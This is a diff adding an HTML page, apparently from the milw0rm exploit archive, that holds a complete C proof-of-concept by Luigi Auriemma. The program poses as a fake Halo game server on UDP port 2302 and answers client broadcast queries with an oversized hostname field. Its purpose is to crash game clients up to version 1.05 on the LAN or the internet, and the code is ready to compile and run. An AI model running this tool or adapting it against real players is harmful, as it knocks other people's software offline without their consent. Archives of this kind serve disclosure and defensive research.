@@ -1,0 +1,295 @@
+<html>
+<head>
+<title>Halo 1.05 and below broadcast client crash </title>
+<pre>
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+#ifdef WIN32
+    #include &lt;winsock.h&gt;
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = &quot;Interrupted system call&quot;; break;
+        case 10009: error = &quot;Bad file number&quot;; break;
+        case 10013: error = &quot;Permission denied&quot;; break;
+        case 10014: error = &quot;Bad address&quot;; break;
+        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
+        case 10024: error = &quot;Too many open files&quot;; break;
+        case 10035: error = &quot;Operation would block&quot;; break;
+        case 10036: error = &quot;Operation now in progress&quot;; break;
+        case 10037: error = &quot;Operation already in progress&quot;; break;
+        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
+        case 10039: error = &quot;Destination address required&quot;; break;
+        case 10040: error = &quot;Message too long&quot;; break;
+        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
+        case 10042: error = &quot;Bad protocol option&quot;; break;
+        case 10043: error = &quot;Protocol not supported&quot;; break;
+        case 10044: error = &quot;Socket type not supported&quot;; break;
+        case 10045: error = &quot;Operation not supported on socket&quot;; break;
+        case 10046: error = &quot;Protocol family not supported&quot;; break;
+        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
+        case 10048: error = &quot;Address already in use&quot;; break;
+        case 10049: error = &quot;Can't assign requested address&quot;; break;
+        case 10050: error = &quot;Network is down&quot;; break;
+        case 10051: error = &quot;Network is unreachable&quot;; break;
+        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
+        case 10053: error = &quot;Software caused connection abort&quot;; break;
+        case 10054: error = &quot;Connection reset by peer&quot;; break;
+        case 10055: error = &quot;No buffer space available&quot;; break;
+        case 10056: error = &quot;Socket is already connected&quot;; break;
+        case 10057: error = &quot;Socket is not connected&quot;; break;
+        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
+        case 10059: error = &quot;Too many references, can't splice&quot;; break;
+        case 10060: error = &quot;Connection timed out&quot;; break;
+        case 10061: error = &quot;Connection refused&quot;; break;
+        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
+        case 10063: error = &quot;File name too long&quot;; break;
+        case 10064: error = &quot;Host is down&quot;; break;
+        case 10065: error = &quot;No Route to Host&quot;; break;
+        case 10066: error = &quot;Directory not empty&quot;; break;
+        case 10067: error = &quot;Too many processes&quot;; break;
+        case 10068: error = &quot;Too many users&quot;; break;
+        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
+        case 10070: error = &quot;Stale NFS file handle&quot;; break;
+        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
+        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
+        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
+        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
+        case 11001: error = &quot;Host not found&quot;; break;
+        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
+        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
+        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
+    exit(1);
+}
+
+
+
+    #define close   closesocket
+#else
+    #include &lt;unistd.h&gt;
+    #include &lt;sys/socket.h&gt;
+    #include &lt;sys/types.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;netinet/in.h&gt;
+    #include &lt;netdb.h&gt;
+#endif
+
+
+
+#define VER     &quot;0.1&quot;
+#define BUFFSZ  2048
+#define PING    &quot;\x05\x00\x00\x00\x00\x00&quot;
+#define PORT    2302
+#define GAMEVER &quot;GAMEVER__HERE&quot;
+#define BOOM    &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot; \
+                &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;
+
+
+
+char *versions[][2] = {
+    { &quot;1.05&quot;,  &quot;01.00.05.0610&quot; },
+    { &quot;1.04&quot;,  &quot;01.00.04.0607&quot; },
+    { &quot;1.031&quot;, &quot;01.00.03.0606&quot; },
+    { &quot;1.03&quot;,  &quot;01.00.03.0605&quot; },
+    { &quot;1.02&quot;,  &quot;01.00.02.0581&quot; },
+    { &quot;1.01&quot;,  &quot;01.00.01.0580&quot; },
+    { &quot;1.00&quot;,  &quot;01.00.00.0564&quot; },
+    { &quot;ce&quot;,    &quot;01.00.00.0609&quot; },
+    { NULL,    NULL }
+};
+
+
+
+void std_err(void);
+
+
+
+int main(int argc, char *argv[]) {
+    int     sd,
+            len,
+            on = 1,
+            i,
+            iver,
+            psz;
+    struct  sockaddr_in peer;
+    u_char  buff[BUFFSZ + 1],
+            *pck,
+            pcklan[] =
+                &quot;\x00\x00\x00\x00\x00&quot;
+                &quot;hostname\0&quot;        BOOM &quot;\0&quot;   /* not only here */
+                &quot;gamever\0&quot;         GAMEVER &quot;\0&quot;
+                &quot;hostport\0&quot;        &quot;\0&quot;
+                &quot;maxplayers\0&quot;      &quot;16\0&quot;
+                &quot;password\0&quot;        &quot;0\0&quot;
+                &quot;mapname\0&quot;         &quot;longest\0&quot;
+                &quot;dedicated\0&quot;       &quot;1\0&quot;
+                &quot;gamemode\0&quot;        &quot;openplaying\0&quot;
+                &quot;game_classic\0&quot;    &quot;0\0&quot;
+                &quot;numplayers\0&quot;      &quot;0\0&quot;
+                &quot;gametype\0&quot;        &quot;CTF\0&quot;
+                &quot;teamplay\0&quot;        &quot;1\0&quot;
+                &quot;gamevariant\0&quot;     &quot;\0&quot;
+                &quot;fraglimit\0&quot;       &quot;3\0&quot;
+                &quot;player_flags\0&quot;    &quot;1943015556,2\0&quot;
+                &quot;game_flags\0&quot;      &quot;65\0&quot;
+                &quot;\0&quot;                &quot;\0&quot;,
+            pckinternet[] =
+                &quot;\x00\x00\x00\x00\x00&quot;
+                BOOM &quot;\0&quot;
+                GAMEVER &quot;\0&quot;
+                &quot;0\0&quot;
+                &quot;CTF\0&quot;
+                &quot;openplaying\0&quot;
+                &quot;0\0&quot;
+                &quot;16\0&quot;;
+
+
+    setbuf(stdout, NULL);
+
+    fputs(&quot;\n&quot;
+        &quot;Halo &lt;= 1.05 broadcast client crash &quot;VER&quot;\n&quot;
+        &quot;by Luigi Auriemma\n&quot;
+        &quot;e-mail: aluigi@altervista.org\n&quot;
+        &quot;web:    http://aluigi.altervista.org\n&quot;
+        &quot;\n&quot;, stdout);
+
+    if(argc &lt; 2) {
+        printf(&quot;\n&quot;
+            &quot;Usage: %s &lt;version&gt;\n&quot;
+            &quot;\n&quot;
+            &quot; You must decide what version of the clients you want to crash:\n&quot;
+            &quot;\n&quot;, argv[0]);
+        for(i = 0; *versions[i]; i++) {
+            printf(&quot; %s\t%s\n&quot;, versions[i][0], versions[i][1]);
+        }
+        fputc('\n', stdout);
+        exit(1);
+    }
+
+    for(iver = 0; versions[iver][0]; iver++) {
+        if(!strcmp(argv[1], versions[iver][0])) break;
+    }
+    if(!versions[iver][0]) {
+        printf(&quot;\nError: you must choose between the versions listed at the beginning\n&quot;);
+        exit(1);
+    }
+    printf(&quot;- version:   %s \t%s\n&quot;, versions[iver][0], versions[iver][1]);
+
+    for(i = 0; i &lt; (sizeof(pcklan) - 14); i++) {
+        if(!memcmp(pcklan + i, GAMEVER, 13)) {
+            memcpy(pcklan + i, versions[iver][1], 13);
+            break;
+        }
+    }
+
+    for(i = 0; i &lt; (sizeof(pckinternet) - 14); i++) {
+        if(!memcmp(pckinternet + i, GAMEVER, 13)) {
+            memcpy(pckinternet + i, versions[iver][1], 13);
+            break;
+        }
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
+#endif
+
+    peer.sin_addr.s_addr = INADDR_ANY;
+    peer.sin_port        = htons(PORT);
+    peer.sin_family      = AF_INET;
+    psz                  = sizeof(peer);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd &lt; 0) std_err();
+
+    printf(&quot;- bind UDP port %d\n&quot;, PORT);
+    if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;on, sizeof(on))
+      &lt; 0) std_err();
+    if(bind(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
+      &lt; 0) std_err();
+
+    fputs(&quot;\nClients:\n&quot;, stdout);
+    while(1) {
+        len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&amp;peer, &amp;psz);
+        if(len &lt; 0) std_err();
+
+        if(buff[2]) {
+            printf(&quot;PING       %s:%hu\n&quot;,
+                inet_ntoa(peer.sin_addr), htons(peer.sin_port));
+
+            if(sendto(sd, PING, sizeof(PING) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
+              &lt; 0) std_err();
+            continue;
+        }
+
+        if(len == 10) {
+            fputs(&quot;LAN        &quot;, stdout);
+            pck = pcklan;
+            len = sizeof(pcklan) - 1;
+        } else {
+            fputs(&quot;INTERNET   &quot;, stdout);
+            pck = pckinternet;
+            len = sizeof(pckinternet) - 1;
+        }
+
+        printf(&quot;%s:%hu\n&quot;,
+            inet_ntoa(peer.sin_addr), htons(peer.sin_port));
+
+        memcpy(pck, buff + 2, 5);
+        if(sendto(sd, pck, len, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
+          &lt; 0) std_err();
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror(&quot;\nError&quot;);
+        exit(1);
+    }
+#endif
+</pre>
+//milw0rm.com
+</html>
+
